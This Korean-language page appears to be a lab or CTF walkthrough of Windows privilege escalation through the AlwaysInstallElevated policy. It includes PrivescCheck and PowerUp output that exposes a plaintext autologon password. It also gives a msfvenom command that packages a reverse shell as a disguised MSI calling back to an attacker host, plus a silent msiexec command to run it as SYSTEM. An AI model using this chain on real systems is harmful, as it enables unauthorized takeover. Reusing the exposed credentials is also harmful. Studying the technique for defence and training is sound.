---
layout: page
title: AlwaysInstallElevated_(feat._PrivescCheck.ps1)
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}


### 1. **취약점 기본 개념 (AlwaysInstallElevated 정책)**

- **정책 역할**: Windows Installer (msiexec.exe)는 소프트웨어 설치 도구로, 기본적으로 사용자 권한으로 MSI 패키지를 설치합니다. 하지만 "AlwaysInstallElevated" 정책이 활성화되면, 모든 MSI 설치가 자동으로 SYSTEM 권한(최고 수준의 로컬 Administrator 권한)으로 실행됩니다. 이는 기업 환경에서 관리자가 소프트웨어를 쉽게 배포하기 위해 설정하지만, 보안상 매우 위험합니다.
- **활성화 조건**: PrivescCheck.ps1 결과처럼, 다음 두 레지스트리 키가 모두 1(DWORD)로 설정되어야 합니다:
    - **HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1**: 시스템 전체(모든 사용자)에 적용.
    - **HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1**: 현재 사용자에 적용.
- **왜 취약한가?**: 이 정책이 둘 다 활성화되면, 저권한 사용자(low-privilege user)가 악성 MSI 파일을 설치할 때 SYSTEM 권한을 상속받습니다. 결과적으로, MSI 내 페이로드(예: 리버스 쉘)가 root 수준으로 실행되어 권한 상승이 발생합니다. Microsoft는 이 설정을 강력히 비추천하며, UAC(User Account Control)를 우회하는 효과가 있습니다.

---

### 2. **취약한 부분 상세 분석**

- **레지스트리 구성 오류**: 시스템 관리자가 그룹 정책(Group Policy)이나 레지스트리를 통해 이 설정을 의도적으로 활성화하거나, 실수로(예: 자동화 스크립트나 오래된 구성) 남겨둔 경우 발생합니다. HKLM만 설정되면 시스템 전체 영향을 주지만, HKCU도 함께 설정되어야 사용자별로 악용 가능합니다. PrivescCheck.ps1이 이를 확인한 대로, "Description: AlwaysInstallElevated is enabled in both HKLM and HKCU"는 취약점을 직접 지시합니다.
- **MSI 설치 메커니즘 취약**: msiexec는 MSI 파일을 처리할 때 정책을 확인합니다. AlwaysInstallElevated가 on이면, 설치 프로세스가 SYSTEM 컨텍스트로 전환됩니다. 이는 정상 설치에는 편리하지만, 악성 MSI(예: 리버스 쉘 포함)를 만들면 SYSTEM 쉘을 spawn할 수 있습니다.
- **runas 명령어의 역할**: runas /user:dev-datasci-lowpriv는 저권한 사용자(dev-datasci-lowpriv)로 명령어를 실행하지만, msiexec 자체가 정책으로 인해 SYSTEM으로 상승합니다. /qn 옵션은 UI 없이 조용히 설치(quiet mode)하므로, 탐지 회피에 유용합니다.
- **전체 취약 포인트**:
    - **정책 활성화**: 둘 다 1로 설정되지 않았다면, 저권한 사용자가 MSI를 설치해도 SYSTEM 권한을 얻지 못합니다.
    - **MSI 페이로드 생성**: msfvenom이 MSI 형식으로 쉘을 패키징하므로, 설치 시 페이로드가 트리거됩니다.
    - **UAC 및 권한 검사 우회**: 정책이 SYSTEM으로 강제하므로, 별도의 권한 요청 없이 상승합니다.


[[PrivescCheck]]


```powershell
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ Configuration - MSI AlwaysInstallElevated         ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the 'AlwaysInstallElevated' policy is enabled  ┃
┃ system-wide and for the current user. If so, the current     ┃
┃ user may install a Windows Installer package with elevated   ┃
┃ (SYSTEM) privileges.                                         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


LocalMachineKey   : HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
LocalMachineValue : AlwaysInstallElevated
LocalMachineData  : 1
CurrentUserKey    : HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
CurrentUserValue  : AlwaysInstallElevated
CurrentUserData   : 1
Description       : AlwaysInstallElevated is enabled in both HKLM and HKCU.
```

```powershell title="PowerUp.ps1"
[*] Checking for Autologon credentials in registry...


DefaultDomainName    : DEV-DATASCI-JUP
DefaultUserName      : dev-datasci-lowpriv
DefaultPassword      : wUqnKWqzha*W!PWrPRWi!M8faUn
AltDefaultDomainName :
AltDefaultUserName   :
AltDefaultPassword   :
```


---

리버스 TCP 쉘을 MSI 패키지로 만듭니다. 설치 시 쉘이 실행되어 공격자(Kali)로 연결합니다.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.1.10 LPORT=443 -a x64 --platform Windows -f msi -o kb1108264.msi
```


- runas: 저권한 사용자 컨텍스트로 전환 (하지만 정책으로 인해 msiexec가 SYSTEM으로 실행).
- msiexec /i: MSI 설치, /qn: 무음 설치.
- 결과: MSI 내 쉘이 SYSTEM으로 실행되어 Administrator(또는 SYSTEM) 권한 리버스 쉘이 Kali에 연결됩니다

```powershell
runas /user:dev-datasci-lowpriv “msiexec /i C:\Users\dev-datasci-lowpriv\Downloads\kb1108264.msi /qn”
```


취약성 악용 이유: 정책이 MSI 설치 프로세스를 SYSTEM으로 강제하므로, 저권한 사용자라도 악성 패키지를 통해 권한을 "빌려" 상승합니다. 이는 Windows Installer의 설계상 보안 홀입니다.